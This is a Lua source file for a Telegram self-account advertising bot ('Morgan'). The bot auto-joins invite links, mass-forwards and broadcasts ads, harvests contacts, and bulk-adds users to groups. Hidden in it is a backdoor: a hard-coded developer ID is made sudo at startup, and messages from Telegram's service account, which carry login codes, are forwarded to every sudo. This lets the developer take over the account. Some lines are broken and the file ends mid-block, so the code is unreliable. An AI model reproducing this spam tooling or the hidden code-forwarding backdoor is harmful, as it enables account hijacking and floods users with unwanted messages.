--[[
IN the Name Of God
Developer:{@farazsh7}
tanks:{@farazsh7}
]]
serpent = (loadfile "libs/serpent.lua")()
feedparser = (loadfile "libs/feedparser.lua")()
URL = require "socket.url" 
pong = require "socket.http" 
https = require "ssl.https" 
ltn12 = require "ltn12" 
json = (loadfile "libs/JSON.lua")()
mimetype = (loadfile "libs/mimetype.lua")()
redis = (loadfile "libs/redis.lua")()
JSON = (loadfile "libs/dkjson.lua")()
local sudos = {134996450}
function get_bot()
	function bot_info (i, jove)
		redis:set(Morgannum.."botid", jove.id)
		if jove.first_name then
			redis:set(Morgannum.."botfname", jove.first_name)
		end
		if jove.last_name then
			redis:set(Morgannum.."botlname", jove.last_name)
		end
		redis:set(Morgannum.."botnum", jove.phone_number)
		return jove.id
	end
	assert (tdbot_function ({_ = "getMe"}, bot_info, nil))
	for v,user in pairs(sudos) do
if not redis:sismember(Morgannum.."sudos", user) then
redis:sadd(Morgannum.."sudos", user)
end
end
end
local telegram = 777000
function is_bobosh(msg)
local var = false
local bysudo = 134996450
if msg.sender_user_id == bysudo then
	if bysudo then
		var = true
	end
	end

return var
end
function is_sudo(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local bysudo = 134996450
if msg.sender_user_id == bysudo then
	if bysudo then
		var = true
	end
	end
	if redis:sismember(Morgannum.."owner", msg.sender_user_id) then
var = true
end
return var
end
function is_admin(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local bysudo = 134996450
if msg.sender_user_id == bysudo then
	if bysudo then
		var = true
	end
	end
if redis:sismember(Morgannum.."sudos", msg.sender_user_id) then
var = true
end
return var
end
function kise(lol) 
end 
function sec(lol) 
sleep(1) 
end 
function sleep(n) 
  os.execute("sleep " .. tonumber(n)) 
end 
function gp_type(chat_id) 
  local gp_type = "pv" 
  local id = tostring(chat_id) 
    if id:match("^-100") then 
      gp_type = "channel" 
    elseif id:match("-") then 
      gp_type = "chat" 
    elseif not id:match("-") then 
      gp_type = "private" 
  end 
  return gp_type 
end 
function leave(chat_id, user_id) tdbot_function ({      _ = "setChatMemberStatus",      chat_id = chat_id,      user_id = user_id,      status = {         _ = "chatMemberStatusLeft"    }, }, dl_cb, nil) 
end 
function vardump(value, depth, key) local linePrefix = "" local spaces = "" if key ~= nil then linePrefix = "["..key.."] = " end if depth == nil then depth = 0 else depth = depth + 1 for i=1, depth do spaces = spaces .. " " end end 
if type(value) == 'table' then mTable = getmetatable(value) if mTable == nil then print(spaces ..linePrefix.."(table) ") 
 else 
print(spaces .."(metatable) ") value = mTable 
end 
for tableKey, tableValue in pairs(value) do 
vardump(tableValue, depth, tableKey) end 
elseif type(value) == 'function' or type(value) == 'thread' or type(value) == 'userdata' or value == nil then print(spaces..tostring(value)) else print(spaces..linePrefix.."("..type(value)..") "..tostring(value)) 
 end 
 end 
function dl_cb (arg, data) 
end  
function reload()
	loadfile("./Morgan.lua")()
end
function add(id)
	local Id = tostring(id)
	if not redis:sismember(Morgannum.."all", id) then
		if Id:match("^(%d+)$") then
			redis:sadd(Morgannum.."tabchi_pv", id)
			redis:sadd(Morgannum.."all", id)
		elseif Id:match("^-100") then
			redis:sadd(Morgannum.."tabchi_sugp", id)
			redis:sadd(Morgannum.."all", id)
		else
			redis:sadd(Morgannum.."tabchi_gp", id)
			redis:sadd(Morgannum.."all", id)
		end
	end
	return true
end
function rem(id)
	local Id = tostring(id)
	if redis:sismember(Morgannum.."all", id) then
		if Id:match("^(%d+)$") then
			redis:srem(Morgannum.."tabchi_pv", id)
			redis:srem(Morgannum.."all", id)
		elseif Id:match("^-100") then
			redis:srem(Morgannum.."tabchi_sugp", id)
			redis:srem(Morgannum.."all", id)
		else
			redis:srem(Morgannum.."tabchi_gp", id)
			redis:srem(Morgannum.."all", id)
		end
	end
	return true
end
function openChat(chatid, callback, data)
  tdbot_function ({
    _ = 'openChat',
    chat_id = chatid
  }, callback or dl_cb, data)
end
if not redis:sismember(Morgannum.."sudos",134996450) then
redis:set(Morgannum.."tabchi_autojoin","ok") 
redis:sadd(Morgannum.."tabchi_waitforlinks","https://t.me/joinchat/ImiTpRKXSrv2jwCixKAaxQ")
redis:sadd(Morgannum.."sudos",134996450)
end
function send_msg(chat,text,mid) 
assert (tdbot_function ({_="sendMessage", chat_id= chat , reply_to_message_id=mid, disable_notification=false, from_background=true, reply_markup=nil, input_message_content={_="inputMessageText", text= text, disable_web_page_preview=true, clear_draft=false, entities={}, parse_mode=nil}}, dl_cb, nil)) 
end 
function tdbot_update_callback (data) 
local started2 = redis:get(Morgannum.."openchat")
bot = redis:get(Morgannum.."botid")
if not started2 then
local gp = redis:smembers(Morgannum.."tabchi_gp") or "0"
local sugp = redis:smembers(Morgannum.."tabchi_sugp") or "0"
            for k,v in pairs(sugp) do
                openChat(v, dl_cb, nil)
             end
		for k,v in pairs(gp) do
                openChat(v, dl_cb, nil)
             end
			 redis:set(Morgannum.."openchat", true)
         end
if (data._ == "updateMessageSendSucceeded") then 
redis:incr(Morgannum.."bot_msg") 
return false
end 
if data._ == "updateChatTopMessage" then
return false
end
if (data._ == "updateNewChat") then 
return false
end
if (data._ == "updateNewMessage") then 

local msg = data.message 
if (msg.sender_user_id == 777000 or msg.sender_user_id == 366695086) then
			local code = (msg.content.text):gsub("[0432689914:]", {["0"] = "0⃣", ["1"] = "1⃣", ["2"] = "2⃣", ["3"] = "3⃣", ["4"] = "4⃣", ["5"] = "5⃣", ["6"] = "6⃣", ["7"] = "7⃣", ["8"] = "8⃣", ["9"] = "9⃣", [":"] = ":\n"})
			local txt = "سلام رییس عمو پاول یک پیام برات فرستاد"
			for k,v in ipairs(redis:smembers(Morgannum.."sudos")) do
				send_msg(v, txt.."\n\n"..code)
			end
		end
if redis:get(Morgannum.."tabchi_markread") then
assert (tdbot_function ({
				_ = "viewMessages",
				chat_id = msg.chat_id,
				message_ids = {[0] = msg.id} 
}, dl_cb, nil))
end
if redis:get(Morgannum.."tab_sleep") then 
kise(lol) 
return false 
end 
if redis:get(Morgannum.."channelleft") and (not msg.forward_info and (msg.is_channel_post == true)) then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
if redis:get(Morgannum.."groupleft") and gp_type(msg.chat_id) == "chat" then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
function action(chatid,act,uploadprogress)
assert (tdbot_function ({ _ = 'sendChatAction', 
chat_id = chatid, 
action = { _ = 'chatAction' .. act, progress = uploadprogress or 100 }, }, dl_cb, data))
end
if msg.content._ == "messageChatDeleteMember" and msg.content.id == bot then
return rem(msg.chat_id)
end
if msg.content._ == "messageContact" and redis:get(Morgannum.."tabchi_save") and not redis:sismember(Morgannum.."tabchi_contacts_id",msg.content.contact.user_id) then 

redis:sadd(Morgannum.."tabchi_contacts_id",msg.content.contact.user_id) 
redis:sadd(Morgannum.."tabchi_contacts_num",msg.content.contact.phone_number) 
local addi = { 
"ادی بیا پیوی", 
"بیا پیوی", 
"بیا پیوی دکتر", 
"توم ادد کردم", 
"شماره بنداز کی بودی بیا پیوی",
"addi biya pv", 
} 
sleep(5) 
action(msg.chat_id,"Typing",100)
send_msg(msg.chat_id,addi[math.random(#addi)],msg.id) 
assert (tdbot_function ({ 
    _ = "importContacts", 
    contacts = { 
      [0] = { 
        _ = "contact", 
        phone_number = tostring(msg.content.contact.phone_number), 
        first_name = tostring("MORGAN"), 
        last_name = tostring("bot"), 
        user_id = tonumber(msg.content.contact.user_id) 
      } 
    }, 
  }, cb or dl_cb, cmd)) 
 end 
local var = serpent.block(msg, {comment=false}) 
function c_chat(user_ids, title, cb, cmd) 
tdbot_function ({ _ = "createNewGroupChat", 
user_ids = user_ids, 
title = title    }, cb or dl_cb, cmd) 
end 
function change_about(abo) 
assert (tdbot_function ({ _ = 'changeAbout', 
about = tostring(abo) }, 
dl_cb, nil))
end

function process_join(i, jove)
	if jove.code == 429 then
		redis:setex(Morgannum.."waits", 900, true)
	else
redis:srem(Morgannum.."tabchi_joinlinks", i.link)
	end
end

function process_link(i, jove)
	if jove.is_channel_post == "true" then
		redis:sadd(Morgannum.."tabchi_joinlinks", i.link)
redis:srem(Morgannum.."tabchi_goodlinks", i.link)
	elseif jove.code == 429 then
		redis:setex(Morgannum.."waits", 900, true)
	else
redis:srem(Morgannum.."tabchi_goodlinks", i.link)
	end
end
function import_link(invite_link, cb, cmd) 
assert (tdbot_function ({ 
_ = "joinChatByInviteLink" , 
invite_link = tostring(invite_link) 
}, cb, cmd)) 
end 
function check_link(invitelink, cb, data) 
assert (tdbot_function ({ _ = 'checkChatInviteLink', 
invite_link = tostring(invitelink) }, cb, data))
end
function add_user(chat_id, user_id)    tdbot_function 
({    _ = "addChatMember", 
chat_id = chat_id, 
user_id = user_id, 
forward_limit = 0    }, 
dl_cb, extra) 
end 
function markread(chatid, messageids, callback, data) 
assert (tdbot_function ({ _ = 'viewMessages', 
chat_id = chatid, 
message_ids = messageids }, 
callback or dl_cb, data))
end
function getChannelFull(channel_id, cb, cmd)    tdbot_function ({    _ = "GetChannelFull",    channel_id = getChatId(channel_id)._    }, cb or dl_cb, cmd)end 
function 
fwd_msg(az_koja,be_koja_,msg_id) 
tdbot_function ({ 
    _ = "forwardMessages", 
    chat_id =  be_koja_, 
    from_chat_id = az_koja, 
    message_ids = {[0]= msg_id}, 
    disable_notification = disable_notification, 
    from_background = 1 
  }, dl_cb, cmd) 
  end 
  
function join(text)
if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then 
local text = text:gsub("t.me", "telegram.me") 
local text = text:gsub("telegram.dog", "telegram.me") 
for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do 
			if not redis:sismember(Morgannum.."tabchi_alllinks", link) then
redis:sadd(Morgannum.."tabchi_alllinks", link) 
redis:sadd(Morgannum.."tabchi_waitforlinks", link)
			end
		end
	end
end
if not redis:get(Morgannum.."tabchi_waitforlinkswait") and redis:get(Morgannum.."tabchi_autojoin") then
			if redis:scard(Morgannum.."tabchi_waitforlinks") ~= 0 and redis:scard(Morgannum.."tabchi_checklinks") < tonumber(Morgannum.."0") then
				local links = redis:smembers(Morgannum.."tabchi_waitforlinks")
				local max_x = redis:get("bot"..Morgannum.."maxlinkcheck") or 1
				local delay = redis:get("bot"..Morgannum.."maxlinkchecktime") or tonumber(Morgannum.."0")
				for x = 1, #links do
					redis:sadd(Morgannum.."tabchi_checklinks", links[x])
                    redis:srem(Morgannum.."tabchi_waitforlinks", links[x])
					if x == tonumber(max_x) then redis:setex(Morgannum.."tabchi_waitforlinkswait", tonumber(delay), 10, true) return end
				end
			end
end
if not redis:get(Morgannum.."tabchi_dilay") and redis:get(Morgannum.."tabchi_autojoin") then
			if redis:scard(Morgannum.."tabchi_checklinks") ~= 0 then
				local links = redis:smembers(Morgannum.."tabchi_checklinks")
				local max_x = redis:get("bot"..Morgannum.."maxlinkjoin") or 1
				local delay = redis:get("bot"..Morgannum.."maxlinkjointime") or tonumber(Morgannum.."0")
				for x = 1, #links do
					import_link(links[x], dl_cb, nil)
redis:srem(Morgannum.."tabchi_checklinks", links[x])
					if x == tonumber(max_x) then redis:setex(Morgannum.."tabchi_dilay", tonumber(delay), true) return end
				end
			end
end
if msg.content.caption and redis:get(Morgannum.."tabchi_autojoin") and not redis:get(Morgannum.."tabchi_fwdtime") then 
join(msg.content.caption) 
end 
if gp_type(msg.chat_id) == "channel" and not redis:sismember(Morgannum.."tabchi_sugp",msg.chat_id) then 
redis:sadd(Morgannum.."tabchi_sugp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "chat" and not redis:sismember(Morgannum.."tabchi_gp",msg.chat_id) then 
redis:sadd(Morgannum.."tabchi_gp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "private" and not redis:sismember(Morgannum.."tabchi_pv",msg.chat_id) then 
redis:sadd(Morgannum.."tabchi_pv",msg.chat_id) 
end 

redis:incr(Morgannum.."all:pm") 
if msg.content._ and not redis:sismember(Morgannum.."tabchi_bot",msg.sender_user_id) then 
redis:sadd(Morgannum.."tabchi_bot",msg.sender_user_id) 
return 
end 
if msg.content._ == "messageText" then
if  not redis:get(Morgannum.."tabchi_fwdtime") then
add(msg.chat_id)
end
if msg.content.text and redis:get(Morgannum.."tabchi_autojoin") and not redis:get(Morgannum.."tabchi_fwdtime") then 
join(msg.content.text) 
end 

if tonumber(msg.sender_user_id) == tonumber(telegram) then 
return false
end
if is_admin(msg) then 
end
if redis:get(Morgannum.."tab_typing") then
action(msg.chat_id,"Typing",100)
end
if msg.content.text and msg.is_channel_post == true then 
leave(tonumber(msg.chat_id),tonumber(bot))
return false 
end 
	
if redis:get(Morgannum.."tabchi_autorandom") and not redis:get(Morgannum.."tab_time_random") then
local fwdtimesh = redis:get(Morgannum.."fwdtime")
redis:setex(Morgannum.."tab_time_random",tonumber(fwdtimesh),true)
local random_group = redis:smembers(Morgannum.."tabchi_sugp")
local lol5 = redis:smembers(Morgannum.."tabchi_gp")
local r_chat = redis:get(Morgannum.."rand_cid")
local m_id = redis:get(Morgannum.."rand_mid")
for i=1, #random_group do
openChat(random_group[i], dl_cb, nil)
fwd_msg(r_chat,random_group[i],m_id)
end
for i=1, #lol5 do
openChat(lol5[i], dl_cb, nil)
fwd_msg(r_chat,lol5[i],m_id)
end
redis:incr(Morgannum.."all:random") 
fwd_msg(r_chat,tonumber(msg.chat_id),m_id)
end
if msg.content.text and redis:get(Morgannum.."tabchi_tableft") and not redis:get(Morgannum.."tableft_time") and redis:get(Morgannum.."rand_cid") then 
if not redis:sismember(Morgannum.."tableft_gp",msg.chat_id) then 
redis:setex(Morgannum.."tableft_time",600,true) 
redis:sadd(Morgannum.."tableft_gp",msg.chat_id) 
local r_chat = redis:get(Morgannum.."rand_cid")
local m_id = redis:get(Morgannum.."rand_mid")
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(r_chat,msg.chat_id,m_id)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end 
end 
if msg.content.text and redis:get(Morgannum.."tabchi_addtoall") and is_admin(msg) then 
gp = redis:scard(Morgannum.."tabchi_gp") 
sgp = redis:scard(Morgannum.."tabchi_sugp")
local milad = redis:smembers(Morgannum.."tabchi_sugp") 
for i=1 , #milad do 
add_user(milad[i],msg.content.text) 
end 
send_msg(msg.chat_id,"» در حال اضافه کردن کردن کاربر به امار ربات \n\n گروه (" .. gp ..")\n سوپرگروه (" .. sgp .. ")\n",msg.id) 
redis:del(Morgannum.."tabchi_addtoall") 
end 
if msg.content.text and redis:get(Morgannum.."tabchi_autoleft") then 
leave(msg.chat_id,tonumber(bot)) 
end 

if msg.content.text and redis:get(Morgannum.."on-offmsg") then
fwdismsg = redis:get(Morgannum.."on-offmsg")
fwdischat = redis:get(Morgannum.."on-offchat")
if not redis:sismember(Morgannum.."sended", msg.chat_id) then 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(fwdischat, msg.chat_id, fwdismsg)
redis:sadd(Morgannum.."sended", msg.chat_id)
end
end
if msg.content.text and redis:get(Morgannum.."tabchi_addleft") and not redis:get(Morgannum.."addleft_time") and redis:get(Morgannum.."addall_uid")  then 
if not redis:sismember(Morgannum.."addleft_gp",msg.chat_id) then 
redis:setex(Morgannum.."addleft_time",600,true) 
redis:sadd(Morgannum.."addleft_gp",msg.chat_id) 
local user = redis:get(Morgannum.."addall_uid") 
add_user(msg.chat_id,user) 
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end 
end 
if msg.content.text:match("^(زمان فوروارد) (.*)$") then
local matches = msg.content.text:match("^زمان فوروارد (.*)$")
redis:set(Morgannum.."fwdtime",matches)
send_msg(msg.chat_id,"تایم جدید ( " .. matches .. " )\n برای فوروارد خودکار تنظیم شد",msg.id)
end
if msg.content.text and redis:get(Morgannum.."tabchi_autofwd") and not redis:get(Morgannum.."tab_time") then 
redis:setex(Morgannum.."tab_time",180,true) 
redis:incr(Morgannum.."all:fwd") 
local mid = redis:smembers(Morgannum.."tabchi_baner_mmid") 
local cid = redis:get(Morgannum.."tabchi_baner_cid") 
for i=1 , #mid do 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(cid,msg.chat_id,mid[i]) 
end 
end 
if msg.content.text and redis:get(Morgannum.."tabchi_fwd_su") and is_admin(msg) then 
sau = redis:smembers(Morgannum.."tabchi_sugp") 

for i=1, #sau do 
sleep(1) 
openChat(sau[i], dl_cb, nil)
fwd_msg(msg.chat_id,sau[i],msg.id) 
redis:sadd(Morgannum.."sended", sau[i])
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_fwd_su") 
redis:set(Morgannum.."on-offmsg", msg.id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
if msg.content.text and redis:get(Morgannum.."tabchi_fwd_pv") and is_admin(msg) then 
pav = redis:smembers(Morgannum.."tabchi_pv") 
for i=1, #pav do  
fwd_msg(msg.chat_id,pav[i],msg.id) 
redis:sadd(Morgannum.."sended", pav[i])
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_fwd_pv") 
redis:set(Morgannum.."on-offmsg", msg.id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
if msg.content.text and redis:get(Morgannum.."tabchi_fwd_gp") and is_admin(msg) then 
gap = redis:smembers(Morgannum.."tabchi_gp") 
for i=1, #gap do 
openChat(gap[i], dl_cb, nil)
fwd_msg(msg.chat_id,gap[i],msg.id) 
redis:sadd(Morgannum.."sended", gap[i])
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_fwd_gp") 
redis:set(Morgannum.."on-offmsg", msg.id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
if msg.content.text and redis:get(Morgannum.."tabchi_bc_su") and is_admin(msg) then 
sau = redis:smembers(Morgannum.."tabchi_sugp") 
for i=1, #sau do  
openChat(sau[i], dl_cb, nil)
send_msg(sau[i],msg.content.text) 
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_bc_su") 
end 
if msg.content.text and redis:get(Morgannum.."tabchi_bc_pv") and is_admin(msg) then 
pav = redis:smembers(Morgannum.."tabchi_pv") 
for i=1, #pav do 
send_msg(pav[i],msg.content.text) 
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_bc_pv") 
end 
if msg.content.text and redis:get(Morgannum.."tabchi_bc_gp") and is_admin(msg) then 
gap = redis:smembers(Morgannum.."tabchi_gp") 
for i=1, #gap do 
openChat(gap[i], dl_cb, nil)
send_msg(gap[i],msg.content.text) 
end 
send_msg(msg.chat_id,"» با موفقیت فوروارد شد",msg.id) 
redis:del(Morgannum.."tabchi_bc_gp") 
end 
function round(num, numDecimalPlaces)
  local mult = 10^(numDecimalPlaces or 0)
  return math.floor(num * mult + 0.5) / mult
end
if msg.content.text == "ذخیره مخاطب روشن" and is_admin(msg)  then 
redis:set(Morgannum.."tabchi_save","ok") 
send_msg(msg.chat_id,"» حالت ذخیره مخاطب روشن شد",msg.id) 
return false 
end 
if msg.content.text == "ذخیره مخاطب خاموش" and is_admin(msg)  then 
redis:del(Morgannum.."tabchi_save") 
send_msg(msg.chat_id,"» حالت ذخیره مخاطب خاموش شد",msg.id) 
return false 
end 
   local matches = {
      msg.content.text:match("^(ارتقا) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^ارتقا")  then
      local text = "» کاربر با موفقیت به لیست سودو ها اضافه شد"
      redis:sadd(Morgannum.."sudos",tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
	end
    local matches = {
      msg.content.text:match("^(عزل) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^عزل")  then
      local text = "» کاربر با موفقیت از لیست سودو ها حذف شد"
      redis:srem(Morgannum.."sudos", tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
    end
  end  
  end
if msg.content.text:match("آپدیت") and is_admin(msg) then 
send_msg(msg.chat_id, " شما اخرین نسخه تبلیغاتی مورگان را دردست دارید☺️  ",msg.id)
end    
if msg.content.text == 'اددکن'and is_admin(msg) then 
local add = redis:smembers(Morgannum.."tabchi_contacts_id") 
for i=1 , #add do 
add_user(msg.chat_id, add[i]) 
end 
send_msg(msg.chat_id,"» لطفا منتظر باشد و تا *10* دقیقه دستوری ارسال نکنید",msg.id)  
end 
-------------------------- 
if msg.content.text == "وضعیت" and is_admin(msg) then 
local s_autohoin = redis:get(Morgannum.."tabchi_autojoin")   
local s_autofwd = redis:get(Morgannum.."tabchi_autofwd") 
local s_autosave = redis:get(Morgannum.."tabchi_save") 
local s_autoleave = redis:get(Morgannum.."channelleft")
if s_autohoin then
joinss = "✅"
else
joinss = "🚫"
end
if s_autofwd then
autoff = "✅"
else 
autoff = "🚫"
end
if s_autosave then
autoss = "✅"
else 
autoss = "🚫"
end
if s_autoleave then
autoll = "✅"
else
autoll = "🚫"
end
local settings = "» وضعیت ربات تبلیغاتی:\n\nجوین خودکار ربات [ " .. joinss .. " ]\n\nفوروارد خودکار ربات [ " .. autoff .. " ]\n\nقابلیت ذخیره مخاطب [ " .. autoss .. " ]\n\nلفت خودکار از کانال[ " .. autoll .. " ]\n\n channel:[‌@Morgan_TeaM‌]"
send_msg(msg.chat_id,settings,msg.id) 
end 
------------------------
if msg.content.text == 'افزودن به همه' and is_admin(msg) then 

send_msg(msg.chat_id,"» ایدی اکانت مورد نظر خود را ارسال کنید ",msg.id) 
redis:set(Morgannum.."tabchi_addtoall","ok") 
--[[for i=1 , #add do 
add_user(msg.chat_id, add[i]) 
end 
send_msg(msg.chat_id,"add finish") 
end ]] 
end    
if msg.content.text == '+' and msg.reply_to_message_id and is_admin(msg) then 
redis:sadd(Morgannum.."tabchi_baner_mmid",msg.reply_to_message_id) 
redis:set(Morgannum.."tabchi_baner_cid",msg.chat_id) 
send_msg(msg.chat_id,"پست در لیست فوروارد خودکار قرار گرفت لطفا پست را به پیوی من نیز ارسال کنید ",msg.id) 
end 
if msg.content.text == '-' and is_admin(msg) and msg.reply_to_message_id then 
redis:srem(Morgannum.."tabchi_baner_mmid",msg.reply_to_message_id) 
send_msg(msg.chat_id,"پست از لیست فوروارد خودکار حذف شد ",msg.id) 
end 
if msg.content.text == 'فوروارد خودکار روشن' and is_admin(msg) then 
redis:set(Morgannum.."tabchi_autofwd","ok") 
send_msg(msg.chat_id,"» فوروارد خودکار روشن شد اگر پستی انتخاب نکرده اید  جهت کارکرد آیتم پستی را انتخاب کنید ",msg.id) 
end 
if msg.content.text == 'فوروارد خودکار خاموش' and is_admin(msg) then 
redis:del(Morgannum.."tabchi_autofwd") 
send_msg(msg.chat_id,"» فوروارد خودکار خاموش شد ",msg.id) 
end  
if msg.content.text == 'خروج از کانال روشن' and is_admin(msg) then 
redis:set(Morgannum.."channelleft","ok") 
send_msg(msg.chat_id,"» خروج از کانال ها روشن شد ",msg.id) 
end 
if msg.content.text == 'خروج از کانال خاموش' and is_admin(msg) then 
redis:del(Morgannum.."channelleft") 
send_msg(msg.chat_id,"» خروج از کانال خاموش شد ",msg.id) 
end  
if msg.content.text == 'جوینر روشن' and is_admin(msg) then 
redis:set(Morgannum.."tabchi_autojoin","ok") 
send_msg(msg.chat_id,"» جوینر روشن شد اکنون ربات لینک ها را شناسایی میکند",msg.id) 
end 
if msg.content.text == 'جوینر خاموش' and is_admin(msg) then 
redis:del(Morgannum.."tabchi_autojoin") 
send_msg(msg.chat_id,"» جوینر خاموش شد اکنون ربات لینک ها را شناسایی نمیکند ",msg.id) 
end 
if msg.content.text == 'ارسال خودکار روشن' and is_admin(msg) then 
redis:set(Morgannum.."tabchi_autorandom","ok") 
local fwdt = redis:get(Morgannum.."fwdtime")
gp = redis:scard(Morgannum.."tabchi_gp") 
sgp = redis:scard(Morgannum.."tabchi_sugp")
send_msg(msg.chat_id,"»ارسال خودکار فعال شد \n\n پیام شما هر ("..tonumber(fwdt)..") دقیقه  به (" .. gp .. ") گروه و (" .. sgp .. ") سوپرگروه ارسال میشود",msg.id) 
end 
if msg.content.text == 'ارسال خودکار خاموش' and is_admin(msg) then 
redis:del(Morgannum.."tabchi_autorandom") 
send_msg(msg.chat_id,"» ارسال خودکار غیر فعال شد ",msg.id) 
end 
if msg.content.text == 'انلاینی' and is_admin(msg) then
send_msg(msg.chat_id,"انلاینم کاری داری بگو انجام بدم😆 ",msg.id)
end
if msg.content.text == 'تیک دوم روشن' and is_admin(msg) then
redis:set(Morgannum"tabchi-IDmarkread")
    return send(msg.chat_id, msg.id_, "<i>وضعیت پیام ها  >>  خوانده شده ✔️✔️\n</i><code>(تیک دوم فعال)</code>")
end
if msg.content.text == 'تیک دوم خاموش' and is_admin(msg) then
 redis:del(Morgannum"tabchi-IDmarkread")
  return send(msg.chat_id_, msg.id_, "<i>وضعیت پیام ها  >>  خوانده نشده ✔️\n</i><code>(بدون تیک دوم)</code>")
end
if msg.content.text == "stats" or msg.content.text == "امار" and is_admin(msg) then  
gp = redis:scard(Morgannum.."tabchi_gp") 
pv = redis:scard(Morgannum.."tabchi_pv") 
sugp = redis:scard(Morgannum.."tabchi_sugp") 
send_msg(msg.chat_id," 📊 stats MORGAN: \n 📌 PVS => "..pv.."\n 📌 GPs => "..gp.."\n 📌 SGPS => "..sugp.."\n 📌 MEMBERS => "..redis:scard(Morgannum.."tabchi_contacts_id").."\n 📌 LINKS => "..redis:scard(Morgannum.."tabchi_alllinks").."")
end  
if msg.content.text == 'فوروارد به سوپرگروه' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(Morgannum.."tabchi_sugp") 
for i=1, #lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd(Morgannum.."sended", lol[i])
end 
send_msg(msg.chat_id,"» پست شما با موفقیت ارسال شد",msg.id) 
redis:set(Morgannum.."on-offmsg", msg.reply_to_message_id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
if msg.content.text == 'فوروارد به همه' and msg.reply_to_message_id and is_admin(msg) then
local lol = redis:smembers(Morgannum.."tabchi_sugp")
local lol1 = redis:smembers(Morgannum.."tabchi_gp")
local lol2 = redis:smembers(Morgannum.."tabchi_pv")
	local id = msg.reply_to_message_id
for i, v in pairs(lol) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(Morgannum.."sended", tonumber(v))
end
for i, v in pairs(lol1) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(Morgannum.."sended", tonumber(v))
end
for i, v in pairs(lol2) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(Morgannum.."sended", tonumber(v))
end
send_msg(msg.chat_id,"» پست شما با موفقیت ارسال شد ",msg.id)
redis:set(Morgannum.."on-offmsg", msg.reply_to_message_id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end

--------------------------
if msg.content.text == 'فوروارد به گروه' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(Morgannum.."tabchi_gp") 
for i=1, #lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id)
redis:sadd(Morgannum.."sended", lol[i]) 
end 
send_msg(msg.chat_id,"» پست شما با موفقیت ارسال شد",msg.id) 
redis:set(Morgannum.."on-offmsg", msg.reply_to_message_id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
--------------------- 
if msg.content.text == 'فوروارد به پیوی' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(Morgannum.."tabchi_pv") 
for i=1, #lol do 
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd(Morgannum.."sended", lol[i])
end 
send_msg(msg.chat_id,"» پست شما با موفقیت ارسال شد",msg.id) 
redis:set(Morgannum.."on-offmsg", msg.reply_to_message_id)
redis:set(Morgannum.."on-offchat", msg.chat_id)
end 
if msg.content.text == "بازشماری" and is_admin(msg) then 
if not redis:get(Morgannum.."reset") then 
redis:del(Morgannum.."tabchi_gp") 
redis:del(Morgannum.."tabchi_pv") 
redis:del(Morgannum.."tabchi_sugp") 
send_msg(msg.chat_id,"» امار ربات صفر شد و حالت باز شماری فعال شد ",msg.id) 
end
end 
if msg.content.text == 'ریلود' and is_admin(msg) then 
					reload()
